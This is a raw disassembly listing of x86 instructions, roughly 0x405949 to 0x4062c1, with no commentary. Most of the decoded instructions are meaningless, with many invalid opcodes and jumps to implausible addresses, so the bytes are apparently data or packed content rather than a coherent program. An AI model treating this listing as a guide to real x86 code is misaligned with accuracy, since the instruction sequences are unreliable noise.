  405949:	pusha  
  40594a:	add    cl,ch
  40594c:	xchg   ecx,eax
  40594d:	inc    ebp
  40594e:	jne    0x40593c
  405950:	mov    bl,0x4f
  405952:	add    cl,ch
  405954:	cmp    dh,BYTE PTR [ebx-0x6b]
  405957:	stos   DWORD PTR es:[edi],eax
  405958:	mov    bh,0x85
  40595a:	call   FWORD PTR [ebx+edi*8-0x2d]
  40595e:	dec    edi
  40595f:	adc    DWORD PTR [ecx-0x3d16bf2c],ebp
  405965:	nop
  405966:	mov    al,ds:0xbff93ae9
  40596b:	adc    al,0x56
  40596d:	cwde   
  40596e:	xchg   esp,eax
  40596f:	jmp    0x87a859ae
  405974:	gs inc eax
  405976:	add    BYTE PTR [esi+0x2e],dh
  405979:	hlt    
  40597a:	out    0x76,eax
  40597c:	jmp    0x405902
  40597e:	push   DWORD PTR [esi+ebx*4-0x3e]
  405982:	(bad)  
  405983:	pop    esi
  405984:	mov    esp,0x55272
	...
  405999:	add    BYTE PTR [eax],al
  40599b:	add    BYTE PTR [ebx+0x30],ch
  40599e:	call   0xffc521b5
  4059a3:	cdq    
  4059a4:	mov    ch,0xa
  4059a6:	adc    BYTE PTR [ecx+0x41080abd],bl
  4059ac:	or     eax,DWORD PTR [esi-0x322ad101]
  4059b2:	into   
  4059b3:	es mov ah,0x98
  4059b6:	arpl   WORD PTR [ebx+edi*2-0x2c],bp
  4059ba:	mov    BYTE PTR [ecx+ecx*4-0x7a],ch
  4059be:	dec    DWORD PTR [esi]
  4059c0:	xor    eax,0xa10030a7
  4059c5:	add    bh,bh
  4059c7:	mov    ch,0xc
  4059c9:	jle    0x4059ca
  4059cb:	(bad)  
  4059cc:	cmp    BYTE PTR [ebx],dh
  4059ce:	mov    eax,ds:0xbf87a000
  4059d3:	je     0x405a33
  4059d5:	in     al,0xe5
  4059d7:	sub    BYTE PTR [ecx-0x4],dl
  4059da:	(bad)  
  4059db:	jne    0x405971
  4059dd:	push   0x7b87d2a9
  4059e2:	push   DWORD PTR [ebp-0x84f4]
  4059e8:	and    BYTE PTR [ecx+esi*8-0x2e],ah
  4059ec:	(bad)  
  4059ed:	jnp    0x405a3f
  4059ef:	push   eax
  4059f0:	jecxz  0x4059ef
  4059f2:	str    WORD PTR [ebp+ecx*4+0x67]
  4059f7:	mov    eax,0x50004180
  4059fc:	mov    eax,0xa103
	...
  405a11:	add    BYTE PTR [eax],al
  405a13:	add    BYTE PTR [eax+0x67],ah
  405a16:	add    eax,0x61b8
  405a1b:	add    BYTE PTR [edx],bl
  405a1d:	xchg   DWORD PTR [edi-0x131a68c],edi
  405a23:	jne    0x405a3d
  405a25:	push   0x7c97fe96
  405a2a:	call   0xffbcb100
  405a2f:	lea    ecx,[ebp-0x7800013f]
  405a35:	iret   
  405a36:	(bad)  
  405a37:	mov    ch,0xb4
  405a39:	jge    0x405a3a
  405a3b:	jmp    FWORD PTR [eax-0x3c]
  405a3e:	lahf   
  405a3f:	add    BYTE PTR [eax],dl
  405a41:	add    eax,eax
  405a43:	minps  xmm1,XMMWORD PTR [edi+0x7c17fffe]
  405a4a:	mov    ch,0xbc
  405a4c:	inc    esi
  405a4d:	jl     0x405a4e
  405a4f:	call   0xa4098d
  405a54:	cmp    edx,esi
  405a56:	dec    ebp
  405a57:	mov    eax,0xe883facf
  405a5c:	cwde   
  405a5d:	rol    DWORD PTR [ebx-0x9280f01],cl
  405a63:	dec    DWORD PTR ds:0x7583971e
  405a69:	popf   
  405a6a:	dec    ebx
  405a6b:	inc    ebp
  405a6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a6d:	cdq    
  405a6e:	add    eax,DWORD PTR [eax]
  405a70:	cmp    DWORD PTR [edx+0x4aa10bf9],ebp
  405a76:	push   esi
  405a77:	inc    DWORD PTR [eax]
	...
  405a89:	add    BYTE PTR [eax],al
  405a8b:	add    BYTE PTR [esi+0x2374438e],cl
  405a91:	adc    cl,cl
  405a93:	sti    
  405a94:	jle    0x405a5a
  405a96:	adc    edi,edi
  405a98:	in     al,dx
  405a99:	push   esp
  405a9a:	ins    BYTE PTR es:[edi],dx
  405a9b:	adc    eax,0x50835a8b
  405aa0:	data16 in al,dx
  405aa2:	jg     0x405a8c
  405aa4:	int3   
  405aa5:	pop    edx
  405aa6:	cmp    edi,0xffffffc6
  405aa9:	fdivr  QWORD PTR [edi+0x6a]
  405aac:	cmp    BYTE PTR [edx-0x7],bh
  405aaf:	sti    
  405ab0:	inc    esi
  405ab1:	mov    WORD PTR [ebx],cs
  405ab3:	call   0xffc365bd
  405ab8:	mov    WORD PTR ss:[edi-0x18],?
  405abc:	test   bl,cl
  405abe:	cmp    bh,0xf0
  405ac1:	(bad)  
  405ac2:	sldt   WORD PTR [esi+ebx*1+0x28fd8170]
  405aca:	cmp    bh,0xe
  405acd:	scas   eax,DWORD PTR es:[edi]
  405ace:	add    ebp,DWORD PTR [edx+0x3a]
  405ad1:	ret    0x7f8
  405ad4:	adc    DWORD PTR [ebp+0x4e],eax
  405ad7:	push   esi
  405ad9:	pop    ds
  405ada:	leave  
  405adb:	sti    
  405adc:	popa   
  405add:	add    ch,ch
  405adf:	add    al,0x39
  405ae1:	add    BYTE PTR [ecx+ecx*4-0x1a],ch
  405ae5:	adc    DWORD PTR [esi],0x35986983
  405aeb:	mov    ds:0x43f20039,eax
	...
  405b04:	ss jl  0x405b51
  405b07:	add    al,0x39
  405b09:	add    BYTE PTR [edi+eax*1+0x12e90038],dh
  405b10:	mov    dh,0x67
  405b12:	jmp    0xb958941a
  405b17:	xor    edi,eax
  405b19:	jmp    DWORD PTR [ebx-0x78]
  405b1c:	mov    es,WORD PTR [ecx-0x68167d32]
  405b22:	mov    dl,BYTE PTR [esi+eax*4-0x7e]
  405b26:	jo     0x405ab0
  405b28:	mov    DWORD PTR [ecx+0x4c7682b6],eax
  405b2e:	mov    ecx,0x11826e81
  405b33:	or     BYTE PTR [eax],bh
  405b35:	add    cl,ch
  405b37:	nop
  405b38:	mov    ah,0x8a
  405b3a:	xchg   edi,eax
  405b3b:	adc    BYTE PTR [esi+0x2f],0x1
  405b3f:	ins    BYTE PTR es:[edi],dx
  405b40:	and    DWORD PTR [ecx-0x17],eax
  405b43:	jmp    0x405ba2
  405b45:	iret   
  405b46:	daa    
  405b47:	add    al,0xd1
  405b49:	mov    eax,ds:0x9a36c4b9
  405b4e:	arpl   WORD PTR [edx+0x43f20039],sp
  405b54:	lods   eax,DWORD PTR ds:[esi]
  405b55:	out    dx,eax
  405b56:	rol    BYTE PTR [ebx],cl
  405b58:	lods   al,BYTE PTR ds:[esi]
  405b59:	jnp    0x405bb9
  405b5b:	adc    DWORD PTR [esi],0x8482b982
  405b61:	clc    
  405b62:	push   eax
  405b63:	popf   
  405b64:	add    al,0x82
  405b66:	add    BYTE PTR ds:[eax],0x0
	...
  405b7a:	add    BYTE PTR [eax],al
  405b7c:	les    edx,FWORD PTR [eax-0x7e44c900]
  405b82:	push   0x35e5
  405b87:	je     0x405b3a
  405b89:	mov    esi,edi
  405b8b:	push   ds
  405b8c:	mov    ebx,0x22016830
  405b91:	aas    
  405b92:	add    BYTE PTR [ecx-0x16bf2fa3],al
  405b98:	shl    BYTE PTR [ebx-0x67c557d0],cl
  405b9e:	dec    edi
  405b9f:	push   esi
  405ba0:	cmp    al,BYTE PTR [eax]
  405ba2:	or     ebp,DWORD PTR [ecx]
  405ba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ba5:	lock imul ebp,ecx,0xdff77bb7
  405bac:	mov    eax,0x8ed65081
  405bb1:	stc    
  405bb2:	out    0x2e,eax
  405bb4:	push   cs
  405bb5:	cmp    edi,0xfe90cec6
  405bbb:	mov    esi,0xa47d98b8
  405bc0:	mov    eax,0xdd026a81
  405bc5:	mov    edx,0xf5b8a6d1
  405bca:	mov    edi,0xbf181915
  405bcf:	fnstcw WORD PTR [ebx-0x7f]
  405bd2:	dec    edi
  405bd3:	sub    DWORD PTR [edi-0x50],0x176d86ff
  405bda:	add    BYTE PTR [ecx],bl
  405bdc:	mov    eax,0x81080b
	...
  405bf1:	add    BYTE PTR [eax],al
  405bf3:	add    BYTE PTR [edi-0x7d],ch
  405bf6:	jmp    FWORD PTR [esi-0x63]
  405bf9:	sub    cl,ch
  405bfb:	mov    ax,0xae17
  405bff:	sbb    edx,edi
  405c01:	sub    BYTE PTR [ecx-0xd],0xb9
  405c05:	or     cl,BYTE PTR [eax]
  405c07:	inc    ecx
  405c08:	fild   WORD PTR [ecx-0x6b80ff01]
  405c0e:	lods   eax,DWORD PTR ds:[esi]
  405c0f:	xor    cl,dl
  405c11:	cld    
  405c12:	imul   esp,DWORD PTR [ebx],0xe807892f
  405c18:	mov    edi,DWORD PTR [esi-0x1]
  405c1b:	dec    eax
  405c1d:	dec    esi
  405c1e:	xor    BYTE PTR [ecx-0x30],al
  405c21:	xchg   edx,eax
  405c22:	sbb    edi,edi
  405c24:	mov    ch,0xf4
  405c26:	out    0x8c,eax
  405c28:	ds jg  0x405c2a
  405c2b:	inc    DWORD PTR [ebp+0x1]
  405c2e:	push   DWORD PTR [ebp-0x38]
  405c31:	adc    al,0x9c
  405c33:	retf   0x7faf
  405c36:	leave  
  405c37:	ret    0xfc94
  405c3a:	push   esp
  405c3b:	mov    ecx,DWORD PTR [esp+edx*4-0x41900001]
  405c42:	push   DWORD PTR [ebp-0x64]
  405c45:	jg     0x405cbc
  405c47:	or     BYTE PTR [eax+0xd],bh
  405c4a:	out    dx,al
  405c4b:	(bad)  
  405c4c:	jg     0x405c83
  405c4e:	ret    0x9008
  405c51:	test   eax,0x38e3ec8a
  405c56:	clc    
  405c57:	mov    DWORD PTR [eax],0x0
	...
  405c69:	add    BYTE PTR [eax],al
  405c6b:	add    BYTE PTR ds:0x50000080,dl
  405c71:	cld    
  405c72:	mov    WORD PTR [ebp-0x44],es
  405c75:	lods   al,BYTE PTR ds:[esi]
  405c76:	addr16 clc 
  405c78:	jo     0x405c37
  405c7a:	(bad)  
  405c7b:	(bad)  
  405c7c:	and    eax,0x4535fef0
  405c81:	aad    0x40
  405c83:	add    BYTE PTR [eax-0x500030f9],ch
  405c89:	or     al,0xc0
  405c8b:	je     0x405c8b
  405c8d:	mov    al,BYTE PTR [ebp-0x8]
  405c90:	or     BYTE PTR [ebx],al
  405c92:	add    bh,ch
  405c94:	mov    esi,0x39fc7580
  405c99:	(bad)  
  405c9a:	cmc    
  405c9b:	test   DWORD PTR [esi],0x63e80b55
  405ca1:	xlat   BYTE PTR ds:[ebx]
  405ca2:	jg     0x405ca3
  405ca4:	(bad)  
  405ca5:	mov    ah,0x7b
  405ca7:	call   0xffc08260
  405cac:	add    BYTE PTR [ebx+ecx*1],ch
  405caf:	add    BYTE PTR [edx+esi*8-0x2a0a7e92],cl
  405cb6:	cmp    bh,0xd6
  405cb9:	xchg   BYTE PTR cs:[eax+0x800ecf],bh
  405cc0:	cmp    DWORD PTR [ecx+0x3],ebp
  405cc3:	mov    esi,DWORD PTR [ebp+ebp*2+0xc]
  405cc7:	shr    BYTE PTR ds:0x3938836c,0xf4
  405cce:	add    eax,0xe9
	...
  405ce3:	add    BYTE PTR ds:0x9e000368,bh
  405ce9:	aam    0x13
  405ceb:	dec    DWORD PTR [eiz*2+0x4e69296b]
  405cf2:	jg     0x405d44
  405cf4:	jmp    0x9148563e
  405cf9:	(bad)  
  405cfa:	jle    0x405cfb
  405cfc:	jbe    0x405d3f
  405cfe:	sti    
  405cff:	retf   
  405d00:	outs   dx,BYTE PTR ds:[esi]
  405d01:	scas   al,BYTE PTR es:[edi]
  405d02:	in     al,dx
  405d03:	(bad)  
  405d04:	adc    eax,0xe4ff0428
  405d09:	ins    BYTE PTR es:[edi],dx
  405d0a:	imul   ecx,DWORD PTR ds:0x897f9669,0xffffffb4
  405d11:	sar    DWORD PTR [ebp-0x1],1
  405d14:	inc    esi
  405d15:	adc    DWORD PTR [esi],edi
  405d17:	add    DWORD PTR [ecx],edi
  405d19:	imul   edx,DWORD PTR [eax+0x7ef6fb85],0x898189ff
  405d23:	int3   
  405d24:	add    BYTE PTR es:[esi-0x6f],ah
  405d28:	mov    ah,0x41
  405d2a:	pop    edi
  405d2b:	jg     0x405d43
  405d2d:	rcl    BYTE PTR [ebp-0x47],1
  405d30:	sar    DWORD PTR [ebp+0x4e],1
  405d33:	jg     0x405d46
  405d35:	inc    ecx
  405d36:	fs add al,0x39
  405d39:	mov    DWORD PTR [eax+eax*8-0x9],esp
  405d3d:	jle    0x405d75
  405d3f:	les    edi,FWORD PTR [edi]
  405d41:	test   BYTE PTR [esi+0x74003904],al
  405d47:	cdq    
	...
  405d5c:	sti    
  405d5d:	jge    0x405d7d
  405d5f:	jg     0x405d2f
  405d61:	add    ecx,edi
  405d63:	add    edi,DWORD PTR [ecx]
  405d65:	add    BYTE PTR [ebp+0x2b94b5f7],dl
  405d6b:	jle    0x405d2b
  405d6d:	jle    0x405ddb
  405d6f:	ret    0xd062
  405d72:	adc    BYTE PTR [ecx+0x5d],0xc1
  405d76:	call   0xe9dd1ee6
  405d7b:	add    esi,DWORD PTR [edx]
  405d7d:	inc    eax
  405d7e:	push   esp
  405d7f:	add    ah,BYTE PTR [edx+0x7b9863d9]
  405d85:	jge    0x405d55
  405d87:	jle    0x405d3d
  405d89:	rcl    DWORD PTR [esp+edx*8],0x16
  405d8d:	push   esp
  405d8e:	or     eax,0x376676c5
  405d93:	mov    eax,ds:0x43e20039
  405d98:	in     al,dx
  405d99:	add    DWORD PTR [edx-0x546b523d],edx
  405d9f:	jge    0x405df7
  405da1:	jle    0x405e07
  405da3:	shl    DWORD PTR [edx],0x89
  405da6:	fs mov bh,0x47
  405da9:	jle    0x405d31
  405dab:	jmp    0x405e01
  405dad:	daa    
  405dae:	sub    BYTE PTR [esi+esi*1],al
  405db1:	hlt    
  405db2:	jmp    esp
  405db4:	mov    ds:0xa76ecef7,al
  405db9:	jge    0x405d70
  405dbb:	popf   
  405dbc:	pushf  
  405dbd:	jge    0x405dbe
  405dbf:	mov    ecx,0x0
	...
  405dd4:	mov    ds:0x8f56cf3f,al
  405dd9:	jge    0x405e50
  405ddb:	stc    
  405ddc:	jmp    0x507d:0x7f36b865
  405de3:	cdq    
  405de4:	ja     0x405dd9
  405de6:	pop    es
  405de7:	inc    ecx
  405de8:	xchg   ebp,eax
  405de9:	jle    0x405dea
  405deb:	cs push edx
  405ded:	mov    dh,0xcb
  405def:	es pop edi
  405df1:	mov    eax,DWORD PTR [ebp-0x82abd5]
  405df7:	mov    ecx,0xfbcb34f
  405dfc:	inc    edi
  405dfd:	jge    0x405de7
  405dff:	aad    0x99
  405e01:	add    BYTE PTR [eax],al
  405e03:	fs cli 
  405e05:	or     al,0x85
  405e07:	lea    ebp,[edi]
  405e09:	jge    0x405e0a
  405e0b:	out    dx,al
  405e0c:	out    dx,al
  405e0d:	mov    esp,0x681ce6fe
  405e12:	pop    ds
  405e13:	jl     0x405e52
  405e15:	add    bh,bh
  405e17:	pushf  
  405e18:	int    0x7e
  405e1a:	dec    esi
  405e1c:	adc    eax,0xfcc6cb86
  405e21:	inc    esi
  405e22:	ret    0x3aed
  405e25:	ror    DWORD PTR [edx-0x3bb473b],cl
  405e2b:	scas   al,BYTE PTR es:[edi]
  405e2c:	outs   dx,BYTE PTR ds:[esi]
  405e2d:	or     eax,ebp
  405e2f:	stos   BYTE PTR es:[edi],al
  405e30:	in     al,dx
  405e31:	jl     0x405e32
  405e33:	jo     0x405eb3
  405e35:	jns    0x405e42
  405e37:	test   eax,0x0
	...
  405e4c:	cmp    al,0x84
  405e4e:	mov    ecx,gs
  405e50:	cmp    al,BYTE PTR [eax]
  405e52:	push   0x412f6600
  405e57:	add    BYTE PTR [edi-0x5417048b],dh
  405e5d:	into   
  405e5e:	(bad)  
  405e5f:	inc    DWORD PTR [eax+0x6c]
  405e62:	jle    0x405e96
  405e64:	rol    DWORD PTR [eax],1
  405e66:	push   eax
  405e67:	(bad)  
  405e68:	in     eax,dx
  405e69:	or     al,ch
  405e6b:	xchg   esp,eax
  405e6c:	data16 sti 
  405e6e:	(bad)  
  405e6f:	call   0x3f264c
  405e74:	call   0xe0818fb8
  405e79:	sti    
  405e7a:	je     0x405e78
  405e7c:	js     0x405e58
  405e7e:	int    0xff
  405e80:	pop    ss
  405e81:	push   esp
  405e82:	addr16 jg 0x405e87
  405e85:	inc    edx
  405e86:	dec    DWORD PTR [edi+0x37]
  405e89:	jne    0x405e92
  405e8b:	call   0x3f5943
  405e90:	cmp    BYTE PTR [ebx],ah
  405e92:	retf   
  405e93:	push   DWORD PTR [edi]
  405e95:	ins    BYTE PTR es:[edi],dx
  405e96:	pop    ebx
  405e97:	xor    ah,cl
  405e99:	add    bh,bh
  405e9b:	jne    0x405e41
  405e9d:	call   0xfbd82d5a
  405ea2:	dec    edi
  405ea3:	push   0x413217
  405ea8:	push   eax
  405ea9:	sti    
  405eaa:	je     0x405eb4
  405eac:	js     0x405efc
  405eae:	std    
  405eaf:	inc    DWORD PTR [eax]
	...
  405ec1:	add    BYTE PTR [eax],al
  405ec3:	add    BYTE PTR [edi-0x18],dh
  405ec6:	add    eax,0x67fb77cb
  405ecb:	jbe    0x405f3f
  405ecd:	inc    ecx
  405ece:	(bad)  
  405ecf:	(bad)  
  405ed0:	sub    eax,0xc698e880
  405ed5:	sti    
  405ed6:	(bad)  
  405ed7:	push   eax
  405ed8:	dec    eax
  405ed9:	jnp    0x405f0c
  405edb:	inc    ecx
  405edc:	pusha  
  405edd:	push   eax
  405ede:	(bad)  
  405edf:	jne    0x405f1a
  405ee1:	pop    edi
  405ee2:	imul   esi,DWORD PTR [ecx],0x47
  405ee5:	lea    edi,[eax+ebp*8+0x54]
  405ee9:	mov    al,0x7c
  405eeb:	push   DWORD PTR [esi]
  405eed:	jne    0x405f6e
  405eef:	call   0xffbcff00
  405ef4:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ef6:	or     eax,DWORD PTR [eax]
  405ef8:	test   dh,ch
  405efa:	outs   dx,BYTE PTR ds:[esi]
  405efb:	cmp    ebp,0xffffffdd
  405efe:	shr    DWORD PTR [ecx+0x39],cl
  405f01:	aas    
  405f02:	pop    es
  405f03:	dec    DWORD PTR [ecx+eiz*2-0x3d090195]
  405f0a:	jnp    0x405e95
  405f0c:	jl     0x405f4b
  405f0e:	mov    BYTE PTR ds:0xffc301bf,bh
  405f14:	pushw  0x3
  405f17:	je     0x405f3b
  405f19:	xchg   ecx,eax
  405f1a:	jae    0x405f4c
  405f1c:	js     0x405f87
  405f1e:	aam    0xe7
  405f20:	xor    ah,0x2
  405f23:	add    BYTE PTR [edx],dh
  405f25:	sub    edi,esi
  405f27:	sbb    eax,0x0
	...
  405f3c:	adc    di,bp
  405f3f:	shl    DWORD PTR [esi+0x25c0077a],cl
  405f45:	pop    ebp
  405f46:	shl    DWORD PTR [edi+0x26],cl
  405f49:	mov    bh,0xc2
  405f4b:	(bad)  
  405f4c:	out    dx,al
  405f4d:	popa   
  405f4e:	icebp  
  405f4f:	pop    es
  405f50:	mov    eax,ds:0x8eff79b2
  405f55:	inc    ecx
  405f56:	(bad)
  405f5a:	js     0x405f8f
  405f5c:	jns    0x405ede
  405f5e:	jnp    0x405f5f
  405f60:	jbe    0x405f1c
  405f62:	jbe    0x405f12
  405f64:	xor    DWORD PTR [edx-0x10],ebp
  405f67:	(bad)  
  405f68:	ror    DWORD PTR [esi+0x7a],cl
  405f6b:	jne    0x405f9e
  405f6d:	add    BYTE PTR [ecx-0x6184a88b],dl
  405f73:	out    dx,al
  405f74:	sbb    edi,DWORD PTR [ebx+0x1c]
  405f77:	or     al,0x51
  405f79:	arpl   WORD PTR [edi-0x1b19c185],cx
  405f7f:	jp     0x405f2d
  405f81:	or     BYTE PTR [ecx+0x767b2f59],dl
  405f87:	out    dx,al
  405f88:	pop    esp
  405f89:	jnp    0x405f7f
  405f8b:	or     edx,DWORD PTR [ecx]
  405f8d:	dec    edi
  405f8e:	addr16 jnp 0x405fa7
  405f91:	call   0xb89480
  405f96:	push   esi
  405f97:	icebp  
  405f98:	ds push 0x7afe78a4
  405f9e:	shl    DWORD PTR [ebx],1
	...
  405fb4:	sub    cl,al
  405fb6:	call   0x4148c435
  405fbb:	cmp    al,0xe4
  405fbd:	jp     0x405fed
  405fbf:	in     al,dx
  405fc0:	push   esp
  405fc1:	xor    DWORD PTR [eax-0xf0b29fd],ebp
  405fc7:	imul   esp,DWORD PTR [edx],0x7d
  405fca:	push   ss
  405fcb:	jnp    0x40601e
  405fcd:	xchg   esp,eax
  405fce:	fadd   st,st(4)
  405fd0:	mov    esi,0xa10b7c79
  405fd5:	sbb    esp,edi
  405fd7:	jp     0x405f87
  405fd9:	out    0x22,eax
  405fdb:	xor    eax,0xf0edfff8
  405fe0:	ss push 0x7a9678f8
  405fe6:	push   ecx
  405fe7:	jl     0x406031
  405fe9:	shr    eax,0x7a
  405fec:	or     al,0x8
  405fee:	sar    edi,0x7d
  405ff1:	jp     0x405fb9
  405ff3:	jp     0x405fe1
  405ff5:	jnp    0x405fb5
  405ff7:	lock ss push 0x7afa3300
  405ffe:	dec    DWORD PTR [esi]
  406000:	in     al,dx
  406001:	cmp    eax,0x8569e904
  406006:	in     al,dx
  406007:	push   0x51
  406009:	push   es
  40600a:	add    BYTE PTR ds:0xf9757b2b,bl
  406010:	ret    
  406011:	hlt    
  406012:	or     eax,DWORD PTR [esi-0x4c17fdd7]
	...
  40602c:	lahf   
  40602d:	jns    0x40602e
  40602f:	jbe    0x40605a
  406031:	push   es
  406032:	call   0xffb9cdc8
  406037:	xor    BYTE PTR [esp+ecx*1+0x0],bh
  40603b:	mov    ah,0xbf
  40603d:	ins    BYTE PTR es:[edi],dx
  40603e:	sub    DWORD PTR ds:0x4dffe68e,0x9
  406045:	push   cs
  406046:	(bad)  
  406047:	mov    esp,0xed75794a
  40604c:	bound  edx,QWORD PTR [edx-0x34]
  40604f:	arpl   WORD PTR ss:0x8906b5c0,ax
  406056:	inc    ebp
  406057:	and    eax,0xa83269e2
  40605c:	cmp    bh,BYTE PTR [ecx+0x75]
  40605f:	adc    eax,0xeccc752
  406064:	inc    ebx
  406065:	call   0xba644969
  40606a:	push   eax
  40606b:	(bad)  
  40606c:	sahf   
  40606d:	add    eax,ebp
  40606f:	dec    esp
  406070:	and    edi,DWORD PTR [ecx-0x1]
  406073:	sbb    DWORD PTR [edi],0x11e9412e
  406079:	repz sti 
  40607b:	shl    DWORD PTR [ebx+0x4b],1
  40607e:	call   esi
  406080:	xchg   ebp,eax
  406081:	add    BYTE PTR [eax],al
  406083:	mov    esi,0xfed0c3
  406088:	xor    eax,0xaf8ae80c
  40608d:	idiv   esi
  40608f:	push   0x0
	...
  4060a4:	push   esi
  4060a5:	xor    al,0x41
  4060a7:	add    BYTE PTR [edi+0x53e8fb69],cl
  4060ad:	ret    0xfffe
  4060b0:	sub    BYTE PTR [edx],al
  4060b2:	add    bh,ch
  4060b4:	out    dx,al
  4060b5:	push   ebx
  4060b6:	(bad)  
  4060b7:	jne    0x406111
  4060b9:	in     eax,0x6e
  4060bb:	(bad)  
  4060bc:	mov    edi,0xac75fef6
  4060c1:	in     al,dx
  4060c2:	pop    ebp
  4060c3:	leave  
  4060c4:	scas   eax,DWORD PTR es:[edi]
  4060c5:	test   eax,0x54fd00c2
  4060cb:	mov    ebp,DWORD PTR [esp+ebp*2+0x12]
  4060cf:	xor    esp,ecx
  4060d1:	cld    
  4060d2:	(bad)  
  4060d3:	jne    0x4060f1
  4060d5:	in     eax,0xe8
  4060d7:	int3   
  4060d8:	outs   dx,DWORD PTR ds:[esi]
  4060d9:	idiv   esi
  4060db:	jne    0x4060ed
  4060dd:	dec    ebp
  4060de:	out    0x34,eax
  4060e0:	sbb    eax,0xa5fffef7
  4060e5:	or     BYTE PTR [eax-0x1],dl
  4060e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e9:	add    al,0xe8
  4060eb:	ds pop ds
  4060ed:	idiv   esi
  4060ef:	push   0x4133cf
  4060f4:	das    
  4060f5:	imul   ecx,DWORD PTR [ebx],0xfec817e8
  4060fb:	(bad)  
  4060fc:	aas    
  4060fd:	imul   ecx,DWORD PTR [edi],0xcd124850
  406103:	jmp    FWORD PTR [edi+0x1474f7]
	...
  406119:	add    BYTE PTR [eax],al
  40611b:	add    al,al
  40611d:	div    DWORD PTR [eax+ecx*1+0x68]
  406121:	adc    bh,bh
  406123:	jmp    FWORD PTR [edi-0x3b]
  406126:	rcl    DWORD PTR [eax],0x39
  406129:	addr16 into 
  40612b:	mov    cl,BYTE PTR [ebp+0x76fc3ee5]
  406131:	cmp    ecx,DWORD PTR [eax]
  406133:	call   0xffb90d41
  406138:	xor    ah,BYTE PTR [edi+0x23b049ef]
  40613e:	js     0x4061a8
  406140:	cmp    DWORD PTR [edi+0x68],esp
  406143:	mov    esi,0x413596e1
  406148:	cmp    DWORD PTR [edx+0x133efbee],edx
  40614e:	or     al,0xe8
  406150:	ret    0x787e
  406153:	jmp    DWORD PTR [ecx-0x1810fc98]
  406159:	add    DWORD PTR [ebp+0x32],edi
  40615c:	js     0x4061c7
  40615e:	js     0x4061d5
  406160:	adc    eax,0x2107eddf
  406165:	push   eax
  406166:	js     0x406167
  406168:	push   es
  406169:	inc    edx
  40616a:	add    eax,0xeb880e00
  40616f:	add    eax,0xff03a82a
  406174:	fs xor eax,0xc1317578
  40617a:	loope  0x40617a
  40617c:	fisub  WORD PTR [esi]
  40617e:	js     0x4061f5
	...
  406194:	aad    0x11
  406196:	mov    ah,0xc8
  406198:	into   
  406199:	push   ss
  40619a:	dec    edx
  40619b:	ret    0x6931
  40619e:	into   
  40619f:	mov    cl,ch
  4061a1:	jmp    0x4ed:0x6923fc3e
  4061a8:	scas   al,BYTE PTR es:[edi]
  4061a9:	in     al,dx
  4061aa:	or     ch,al
  4061ac:	mov    WORD PTR [eax+edi*2],fs
  4061af:	push   DWORD PTR [eax+0x7868779c]
  4061b5:	add    BYTE PTR [ebx],bl
  4061b7:	lds    ecx,FWORD PTR [esi-0x7cd9a21]
  4061bd:	call   ebp
  4061bf:	xor    DWORD PTR [ecx+ebp*1],eax
  4061c2:	sub    BYTE PTR [esi+esi*2],al
  4061c5:	in     eax,dx
  4061c6:	lock imul ebx,DWORD PTR [edi-0x2e88418a],0x52
  4061ce:	sti    
  4061cf:	les    ebx,FWORD PTR [esi-0x21]
  4061d2:	push   ecx
  4061d3:	xor    bh,al
  4061d5:	jmp    DWORD PTR [ebp+0x2828c431]
  4061db:	add    al,0x46
  4061dd:	in     eax,dx
  4061de:	loopne 0x40624b
  4061e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061e1:	jbe    0x406171
  4061e3:	ja     0x406186
  4061e5:	pop    eax
  4061e6:	mov    ebx,0x65df2ec4
  4061eb:	xor    bh,BYTE PTR [eax+0x0]
  4061ee:	jbe    0x406221
  4061f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061f1:	sub    DWORD PTR [eax],ebp
  4061f3:	add    al,0x16
  4061f5:	in     eax,dx
  4061f6:	lock imul eax,DWORD PTR [eax],0x0
	...
  40620a:	add    BYTE PTR [eax],al
  40620c:	(bad)  
  40620d:	jbe    0x40626d
  40620f:	ja     0x4061a2
  406211:	pop    ebp
  406212:	sbb    eax,ebp
  406214:	(bad)  
  406215:	fisub  WORD PTR [ebp+0x32]
  406218:	js     0x40621a
  40621a:	inc    esi
  40621b:	xor    DWORD PTR [ecx+ebp*1-0x58],esp
  40621f:	add    esp,esi
  406221:	in     al,dx
  406222:	loopne 0x40628f
  406224:	push   edi
  406225:	jbe    0x406255
  406227:	ja     0x40628a
  406229:	inc    ecx
  40622a:	fcmovnb st,st(4)
  40622c:	into   
  40622d:	fimul  WORD PTR [ebx+0x32]
  406230:	js     0x406232
  406232:	push   ss
  406233:	xor    DWORD PTR [ecx+ebp*1-0x58],eax
  406237:	add    esi,DWORD PTR [esi-0x940f14]
  40623d:	jne    0x40623d
  40623f:	jbe    0x406252
  406241:	push   ebx
  406242:	add    BYTE PTR [ebx+0x3c677675],bh
  406248:	dec    ebx
  406249:	sar    edi,0xe5
  40624c:	dec    ecx
  40624d:	in     eax,dx
  40624e:	sub    BYTE PTR [eax],ch
  406250:	cmp    eax,0x12e17577
  406255:	cs dec dh
  406258:	out    dx,eax
  406259:	out    0xd7,eax
  40625b:	sti    
  40625c:	jne    0x4062d4
  40625e:	mov    WORD PTR [bx+si],gs
  406261:	sar    edi,0xb5
  406264:	sub    ebp,ebp
  406266:	sub    BYTE PTR [eax],ch
  406268:	cmp    eax,0xe2f17577
  40626d:	adc    eax,0x9efe
	...
  406282:	add    BYTE PTR [eax],al
  406284:	iret   
  406285:	out    0xe4,eax
  406287:	(bad)  [ebp+0x76]
  40628a:	addr16 cmp al,0x68
  40628d:	mov    edi,0xeb6985ff
  406292:	sub    BYTE PTR [eax],ch
  406294:	cmp    eax,0x92e17575
  406299:	(bad)  
  40629a:	std    
  40629b:	outs   dx,BYTE PTR ds:[esi]
  40629c:	(bad)
  4062a0:	hlt    
  4062a1:	jne    0x40630a
  4062a3:	dec    ax
  4062a5:	mov    edi,0x38c0ff
  4062aa:	add    BYTE PTR [ecx+0x6f],ch
  4062ad:	jmp    0x4062b6
  4062af:	push   ecx
  4062b0:	push   edi
  4062b1:	jae    0x4062b2
  4062b3:	rcl    BYTE PTR ds:[edx+0x32],cl
  4062b7:	test   al,0x3a
  4062b9:	call   0x763e5e58
  4062be:	addr16 jmp 0x4062fb
  4062c1:	add    BYTE PTR [eax-0x180236e2],al
